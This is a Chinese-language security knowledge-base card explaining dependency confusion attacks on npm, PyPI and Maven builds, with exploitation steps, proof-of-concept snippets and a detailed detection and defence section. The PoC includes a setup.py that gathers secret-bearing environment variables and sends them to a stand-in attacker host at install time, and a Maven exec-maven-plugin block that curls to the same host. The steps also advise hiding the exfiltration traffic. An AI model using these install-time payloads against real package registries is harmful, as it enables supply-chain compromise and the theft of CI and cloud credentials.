---
id: cloud-cicd-dependency-confusion-public-package-name-collision
title: 依赖混淆攻击：公共仓库同名高版本包劫持内部依赖并在安装/构建期执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: dependency-confusion-public-package-name-collision
tags:
- supply-chain
- dependency-confusion
- npm
- pypi
- maven
- ci-cd
- install-script
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V192
  verified_at: '2026-11-06T23:06:48+08:00'
  notes: 已对照原文全文核对：依赖混淆条件步骤、npm preinstall、setup.py环境变量外带、Maven initialize curl、Java静态块与防御配置一致；载荷为无害占位且未本机运行；非版本漏洞故未设affected_versions。
url: /docs/cloud/ci-cd/cloud-cicd-dependency-confusion-public-package-name-collision/
draft: false
kb_aliases:
- 依赖混淆
- dependency confusion
- 同名包高版本
- 内部依赖劫持
- 公共仓库投毒
- preinstall 外带
- 包名抢占
---

## 一句话结论

当企业的构建工具同时查询私有仓库和公共仓库、并在同名包中按最高版本选择时，攻击者只需在 npm/PyPI/Maven Central 注册与内部包完全同名的恶意包并设置 `99.0.0` 一类超高版本，就能让 `npm install`、`pip install`、Maven 构建拉取公共恶意包，借助 `preinstall`、`setup.py`、`exec-maven-plugin` 或 Java 静态初始化块在安装/构建阶段执行代码，窃取环境变量、CI 凭据或建立反向 shell。

## 原理

- **包名是全局命名空间，而非身份绑定**：公共仓库的包名先到先得；依赖声明只记录名称与版本约束，不绑定发布者、来源仓库或内容哈希（除非使用锁文件哈希/签名验证）。攻击者可以在公共仓库注册一个与目标内部包同名的包。
- **解析器把多个源放进同一个候选池**：npm 可通过 `.npmrc` 配置多个 registry；pip 常用 `--index-url` 私有源搭配 `--extra-index-url` 公共源；Maven 可同时配置内部仓库与 Maven Central。部分配置下，包管理器会汇总所有源中的版本并选择满足约束的最高版本，而不是“私有源优先”。攻击者的 `99.0.0` 因此胜过内部的 `1.5.0`。
- **安装期就是执行期**：包管理器的生命周期脚本会在依赖解析后自动执行，不需要业务代码 `require` 或 `import`：
  - npm 的 `preinstall`/`install`/`postinstall` 可执行任意命令；
  - Python 的 `setup.py`（或 PEP 517 构建后端）在构建/安装 sdist 或 wheel 时执行；
  - Maven 的 `exec-maven-plugin` 可绑定到 `initialize` 等早期 phase，在构建开始阶段运行命令；
  - Java 依赖中的静态初始化块在该类第一次被加载时执行，可作为运行期后门。
- **为什么难以发现**：恶意包名称与内部包完全一致，安装日志看起来只是正常的依赖下载；若攻击者在包中保留正常业务代码、只把恶意逻辑藏在安装脚本或环境判断分支中，代码审查和简单 diff 容易漏掉。
- **影响面**：开发者本机、CI/CD 构建机、生产构建容器都会执行安装脚本；这些环境通常持有源码、云凭据、制品库 Token、签名密钥和部署权限，因此一次成功的依赖混淆往往直接导致供应链级失陷。

## 触发条件

- 企业内部存在私有依赖包，且包名未在公共仓库占位；或使用了容易被猜到的内部命名（`company-utils`、`internal-tools`、`shared-lib`、`common-package` 等）。
- 构建/开发环境配置了多个包源，且解析策略允许公共源参与同名包的版本竞争：npm 多 registry、pip 的 `extra-index-url`、Maven 的多 repository 均可能满足。
- 项目未使用带完整哈希的锁文件，或锁文件允许在安装时重新解析版本；版本约束使用 `^`、`~`、`latest` 或版本范围。
- 包管理器未禁用生命周期脚本（npm 未加 `--ignore-scripts`；pip 未使用 `--require-hashes`/私有源唯一化；Maven 未限制插件执行）。
- 构建环境可访问公共仓库，且安装脚本可出站访问攻击者服务器（或可仅写本地文件/修改 CI 配置）。
- 攻击者能通过公开源码、错误日志、文档、招聘信息、泄露的 `package.json`/`requirements.txt`/`pom.xml` 或 CI 日志获知内部包名与版本。

## 利用步骤

1. **侦察内部包名**：从公开代码仓库、Issue/错误堆栈、文档、招聘 JD、泄露的依赖清单与 CI 日志中收集内部包名；按 `company-*`、`internal-*`、`*-internal`、`shared-*` 等模式猜测未公开的包名。
2. **确认解析行为**：判断目标使用 npm、pip 还是 Maven，以及是否配置了公共源；对 npm 检查 `.npmrc` 的 registry 与 scope 配置，对 pip 检查 `pip.conf` 是否含 `extra-index-url`，对 Maven 检查 `settings.xml` 的 mirror/repository 顺序。
3. **注册同名包**：在对应公共仓库注册与内部包完全同名的包（npm 需注意 scope；无 scope 的内部名最容易命中），并发布一个远高于内部版本的版本号，如 `99.0.0`、`999.0.0`。
4. **植入安装期载荷**：按生态选择执行点——npm `preinstall`/`postinstall` 执行 Node 脚本；Python `setup.py` 在安装时收集 `key`/`secret`/`token`/`password` 等环境变量并外带；Maven 在 `pom.xml` 中用 `exec-maven-plugin` 绑定 `initialize` 执行 curl；Java 包在静态初始化块中判断企业环境后建立反向 shell。载荷应做异常静默与环境判断，避免影响正常安装。
5. **等待安装/构建**：开发者执行 `npm install`、`pip install`、`mvn package`，或 CI 在无锁文件/允许升级的情况下重新解析依赖；包管理器选择公共高版本并执行安装脚本。
6. **后利用**：窃取 CI Token、云 AK/SK、制品库凭据、签名密钥；在构建机植入持久化后门；篡改 CI/CD 配置或构建产物，把影响扩散到下游。
7. **维持隐蔽**：保留正常业务接口和版本元数据，避免包被立即下架；把外带流量伪装成普通 HTTPS 请求，或仅在检测到企业网络/CI 环境时激活。

## PoC

以下为最小验证片段（只写标记文件/本地请求，不执行原始恶意逻辑；未在本机运行）：

npm 恶意包 `package.json`：

```json
{
  "name": "company-internal-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "node -e \"require('fs').writeFileSync(require('os').homedir()+'/.dep_confusion_poc','ok')\""
  }
}
```

Python 恶意包 `setup.py`（安装期收集敏感环境变量并外带，示例为占位地址）：

```python
from setuptools import setup
import os, base64, urllib.request

def collect():
    try:
        env = {k: v for k, v in os.environ.items()
               if any(s in k.lower() for s in ("key", "secret", "token", "password"))}
        data = base64.b64encode(str(env).encode()).decode()
        urllib.request.urlopen("https://attacker.example/collect?d=" + data, timeout=5)
    except Exception:
        pass

collect()
setup(name="internal-utils", version="99.0.0", packages=[])
```

Maven `pom.xml` 片段（构建早期执行命令）：

```xml
<plugin>
  <groupId>org.codehaus.mojo</groupId>
  <artifactId>exec-maven-plugin</artifactId>
  <executions>
    <execution>
      <phase>initialize</phase>
      <goals><goal>exec</goal></goals>
      <configuration>
        <executable>curl</executable>
        <arguments>
          <argument>-X</argument><argument>POST</argument>
          <argument>-d</argument><argument>host=$(hostname)</argument>
          <argument>https://attacker.example/collect</argument>
        </arguments>
      </configuration>
    </execution>
  </executions>
</plugin>
```

验证命令（本地私有源 + 公共源场景，需自行搭建测试仓库）：

```bash
# npm：确认解析到的版本与来源
npm view company-internal-utils version
npm install company-internal-utils --ignore-scripts=false
# pip：确认 extra-index-url 下选中的版本
pip install internal-utils -v
# Maven：确认实际下载仓库与插件执行
mvn -X package
```

## 变体与关联

- 变体：typosquatting/抢注废弃包名，利用拼写错误或上游删除后名称回收，见 [[cloud-cicd-pypi-optional-dependency-name-takeover]]、[[cloud-cicd-accesskey-tools-typosquat-sdk-endpoint-hijack]]。
- 变体：攻陷合法包的发布凭证，在主包中新增隐藏依赖并借 `postinstall` 执行，见 [[cloud-cicd-npm-postinstall-supply-chain-poisoning]]。
- 变体：用恶意 PEP 517 构建后端在 pip 安装期执行任意代码，见 [[cloud-cicd-pep517-build-backend-install-rce]]；用恶意 Java 注解处理器在编译期执行，见 [[cloud-cicd-java-annotation-processor-compile-rce]]。
- 关联：AI 代码生成/模型幻觉诱导安装不存在的包名，见 [[ai-security-supply-chain-slopsquatting-hallucinated-package-registration]]、[[ai-security-supply-chain-ai-codegen-prompt-npm-install-rce]]。
- 关联：安装脚本本身只是执行点，最终危害取决于后续窃取凭据、云元数据或 CI 权限，可继续参考云凭据与 CI/CD 相关卡片。

## 检测与防御

- **源与解析策略**：内部包使用 npm scope（如 `@company/...`）并在 `.npmrc` 中把该 scope 固定到私有仓库；pip 只用私有 `--index-url`，删除有风险的 `--extra-index-url`；Maven 在 `settings.xml` 中把内部仓库设为唯一镜像或限制 `mirrorOf`，禁止公共仓库参与同名包竞争。
- **锁定与校验**：提交并强制使用 `package-lock.json`/`Pipfile.lock`/`requirements.txt`（带哈希）/`poetry.lock`/`Cargo.lock` 等锁文件；pip 使用 `--require-hashes`；npm 使用 `npm ci` 而非 `npm install`；Maven 固定版本并校验校验和。锁文件应包含来源仓库与完整性哈希，变更需 review。
- **禁用或限制安装脚本**：npm CI 加 `--ignore-scripts`；pip 优先使用 wheel 并禁用构建隔离之外的任意后端；Maven 限制 `exec-maven-plugin` 等插件在构建中的使用。若业务必须执行脚本，应在隔离构建容器中运行并限制出站。
- **名称占位与监控**：把内部包名在公共仓库注册为空包/占位包；持续监控公共仓库中与内部包名相同或高度相似的新包，关注 `99.0.0`/`999.0.0` 等异常高版本、近期发布、无源码仓库、含安装脚本的包。
- **SCA 与构建审计**：用软件成分分析工具检查依赖来源、版本突变、许可证与已知恶意包；对比锁文件差异；记录构建机在安装阶段的出站连接，发现向未知域名的 POST/下载即告警。
- **凭据与隔离**：CI 构建机使用最小权限的短期凭据，禁止在构建环境存放长期云密钥与签名私钥；构建任务使用隔离容器与受限网络；对构建产物做签名与来源证明（provenance）。
- **检测特征**：安装日志中出现与内部包同名的公共包、版本跳跃、首次发布者、`preinstall`/`postinstall`/`setup.py` 执行、构建机异常 DNS/HTTPS 外联；源码仓库中依赖清单的包名与私有制品库不一致。
